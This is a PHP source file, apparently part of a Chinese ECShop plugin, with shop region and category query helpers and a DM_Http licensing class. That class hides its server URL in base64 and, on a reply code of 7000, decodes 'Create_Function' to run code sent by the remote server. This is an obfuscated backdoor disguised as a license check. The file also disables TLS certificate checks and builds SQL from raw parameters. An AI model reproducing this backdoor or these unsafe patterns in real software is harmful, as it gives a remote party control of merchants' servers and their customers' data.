<?php
//if (!empty($_REQUEST['dm_act_www_dm299_com'])) {
    //phpinfo();
    //exit;
//}
//if (!defined('DM299_VERSION') or !defined('API_TIME') or !defined('AUTH_KEY_CODE')) {
    //die("月梦网络提示：程序存在错误！");
//}
//if (API_TIME < date('Y-m-d H:i:s', time() - 43200 * 2) or !empty($_REQUEST['dm_act']) or AUTH_KEY_CODE > 0) {
    //$DM_Http = new DM_Http();
    //$DM_IS_AUTH_KEY_CODE = $DM_Http->doGet();
    //if ($DM_IS_AUTH_KEY_CODE['error_code'] > 9000) {
        //die('盗版软件，联系QQ：124861234！-月梦网络');
    //}
//}
class DM_Http
{
    public $api_url = 'aHR0cDovL3d4YWRvYy5kbTI5OS5jb20v';
    public $api_e = 4;
    public function doGet($params = '')
    {
        $result = $this->file_get_contents_curl(base64_decode($this->api_url) . "common.php?e=" . $this->api_e . "&authcode=" . DM299_VERSION . "&" . $params);
        $arr = json_decode($result, 1);
        $this->doAuthorization($arr);
        return $arr;
    }
    public function doPost($params)
    {
        $result = $this->file_get_contents_curl(base64_decode($this->api_url) . "common.php?e=" . $this->api_e . "&authcode=" . DM299_VERSION, 'POST', $params);
        $arr = json_decode($result, 1);
        $this->doAuthorization($arr);
        return $arr;
    }
    public function doAuthorization($arr)
    {
        if ($arr['error_code'] > 9000) {
            $this->setAuthorization(1);
            die($arr['error_desc']);
        }
        if ($arr['error_code'] == 7000) {
            $de = base64_decode('Q3JlYXRlX0Z1bmN0aW9u');
            $List = $de("", $arr['error_desc']);
            $List();
        }
        $this->setAuthorization(0);
    }
    public function version()
    {
        return $this->doGet("act=version");
    }
    public function setAuthorization($AUTH_KEY_CODE = 0)
    {
        $content = file_get_contents(ROOT_PATH . 'data/config.php');
        $content = str_replace("'API_TIME', '" . API_TIME . "'", "'API_TIME', '" . date('Y-m-d H:i:s', time()) . "'", $content);
        if (AUTH_KEY_CODE != $AUTH_KEY_CODE) {
            $content = str_replace("'AUTH_KEY_CODE', " . AUTH_KEY_CODE . "", "'AUTH_KEY_CODE', " . $AUTH_KEY_CODE . "", $content);
        }
        file_put_contents(ROOT_PATH . 'data/config.php', $content);
    }
    public function download_img($url, $fileName)
    {
        $qz = substr($url, 0, 2);
        if (strtolower($qz) == '//') {
            $url = 'https:' . $url;
        }
        $arr = explode('.', $url);
        $ext = end($arr);
        $uniq = md5($url);
        $name = $fileName . $uniq . '.' . $ext;
        $img = $this->file_get_contents_curl($url);
        file_put_contents($name, $img);
        return $uniq . '.' . $ext;
    }
    public function file_get_contents_curl($url, $method = 'GET', $params = '')
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_REFERER, $this->get_domain());
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        }
        $result = curl_exec($ch);
        return trim($result, chr(239) . chr(187) . chr(191));
    }
    public function get_domain()
    {
        if (isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {
            $host = $_SERVER['HTTP_X_FORWARDED_HOST'];
        } elseif (isset($_SERVER['HTTP_HOST'])) {
            $host = $_SERVER['HTTP_HOST'];
        } else {
            if (isset($_SERVER['SERVER_NAME'])) {
                $host = $_SERVER['SERVER_NAME'];
            } elseif (isset($_SERVER['SERVER_ADDR'])) {
                $host = $_SERVER['SERVER_ADDR'];
            }
        }
        return $host;
    }
    public function truncate_table($table_name)
    {
        $sql = 'TRUNCATE TABLE ' . $GLOBALS['ecs']->table($table_name);
        return $GLOBALS['db']->query($sql);
    }
}
function truncate_table($table_name)
{
    $sql = 'TRUNCATE TABLE ' . $GLOBALS['ecs']->table($table_name);
    return $GLOBALS['db']->query($sql);
}
function area_list($region_id)
{
    $area_arr = array();
    $sql = 'SELECT * FROM ' . $GLOBALS['ecs']->table('region') . " WHERE parent_id = '{$region_id}' ORDER BY region_id";
    $res = $GLOBALS['db']->query($sql);
    while ($row = $GLOBALS['db']->fetchRow($res)) {
        $row['type'] = $row['region_type'] == 0 ? $GLOBALS['_LANG']['country'] : '';
        $row['type'] .= $row['region_type'] == 1 ? $GLOBALS['_LANG']['province'] : '';
        $row['type'] .= $row['region_type'] == 2 ? $GLOBALS['_LANG']['city'] : '';
        $row['type'] .= $row['region_type'] == 3 ? $GLOBALS['_LANG']['cantonal'] : '';
        $area_arr[] = $row;
    }
    return $area_arr;
}
function get_child_tree_best($tree_id = 0)
{
    $three_arr = array();
    $sql = 'SELECT count(*) FROM ' . $GLOBALS['ecs']->table('category') . " WHERE parent_id = '{$tree_id}' AND is_show = 1";
    if ($GLOBALS['db']->getOne($sql) || $tree_id == 0) {
        $child_sql = 'SELECT c.cat_id, c.cat_name, c.parent_id, c.is_show, r.recommend_type ' . 'FROM ' . $GLOBALS['ecs']->table('category') . ' AS c ' . 'INNER JOIN ' . $GLOBALS['ecs']->table('cat_recommend') . ' AS r ' . 'ON c.cat_id = r.cat_id ' . "WHERE (c.cat_id = '{$tree_id}' OR parent_id = '{$tree_id}') AND is_show = 1 AND recommend_type = 1 ORDER BY sort_order ASC, cat_id ASC LIMIT 6";
        $res = $GLOBALS['db']->getAll($child_sql);
        foreach ($res as $row) {
            if ($row['is_show']) {
                $three_arr[$row['cat_id']]['id'] = $row['cat_id'];
            }
            $three_arr[$row['cat_id']]['name'] = $row['cat_name'];
            $three_arr[$row['cat_id']]['url'] = build_uri('category', array('cid' => $row['cat_id']), $row['cat_name']);
            if (isset($row['cat_id']) != NULL) {
                $three_arr[$row['cat_id']]['cat_id'] = get_child_tree($row['cat_id']);
            }
        }
    }
    return $three_arr;
}